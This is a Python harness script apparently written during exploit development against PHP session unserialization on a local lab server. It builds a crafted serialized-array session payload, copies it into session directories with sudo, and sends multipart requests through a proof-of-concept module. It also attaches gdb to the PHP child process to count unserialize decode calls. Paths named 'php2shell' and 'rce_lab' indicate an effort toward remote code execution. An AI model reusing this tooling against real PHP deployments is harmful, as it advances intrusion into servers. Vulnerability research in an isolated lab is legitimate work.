#!/usr/bin/env python3
"""initcnt.py - does the follow-up request actually decode the session?

Counts php_var_unserialize_init entries (breakpoint) while sending the request.
Prints DECODE_HITS=<n> plus the response status.
"""
import os
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import poc_unserialize as P

URL = "http://127.0.0.1:18120/index.php"
CLOSE = "http://127.0.0.1:18120/close.php"
PEAK = "http://127.0.0.1:18120/peak.php"
BND = b"UctxPoc2026"
MAL = "/ndary=UctxPoc2026"
SESS = "/tmp/php2shell_ap/sess"
LAB = "/tmp/php2shell_ap"

GDB = """set pagination off
break *0x7ffff68835b0
commands
silent
python
open('/tmp/hits.txt','a').write('x')
end
continue
end
continue
"""


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 2000
    open("/tmp/hits.txt", "w").close()
    open("/tmp/cnt.gdb", "w").write(GDB)
    out = subprocess.run(["sudo", "bash", LAB + "/rce_lab.sh"], capture_output=True, text=True).stdout
    child = int(out.split("child=")[1].split()[0])
    subprocess.run(["sudo", "rm", "-f"] + [os.path.join(MAL, f) for f in (os.listdir(MAL) if os.path.isdir(MAL) else [])], check=False)

    sid = "ic%d-abcdef" % n
    P.send(URL, P.arm_body(sid, BND, 20, 65536), BND, sid, 0, 0)
    time.sleep(1.3)
    st_close, _d, _ = P.send(CLOSE, b"", b"bnd", sid, 0, 0)

    inner = "".join("i:%d;a:2:{i:0;i:0;i:1;i:0;}" % i for i in range(n))
    pay = b"k|" + ("a:%d:{%s}" % (n, inner)).encode()
    open("/tmp/ic_pay", "wb").write(pay)
    for d in (MAL, SESS):
        subprocess.run(["sudo", "cp", "/tmp/ic_pay", "%s/sess_%s" % (d, sid)])
        subprocess.run(["sudo", "chmod", "666", "%s/sess_%s" % (d, sid)])
    ondisk = [os.path.getsize("%s/sess_%s" % (d, sid)) for d in (MAL, SESS)]

    g = subprocess.Popen(["sudo", "gdb", "-q", "-p", str(child), "-batch", "-x", "/tmp/cnt.gdb"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1.5)
    st, _d2, _t = P.send(PEAK, b"", b"bnd", sid, 0, 0)
    time.sleep(1.2)
    g.terminate()
    hits = len(open("/tmp/hits.txt").read())
    alive = os.path.exists("/proc/%d" % child)
    print("rounds=%d close=%s ondisk=%s peak=%s DECODE_HITS=%d alive=%s"
          % (n, st_close, ondisk, st, hits, alive))


if __name__ == "__main__":
    main()
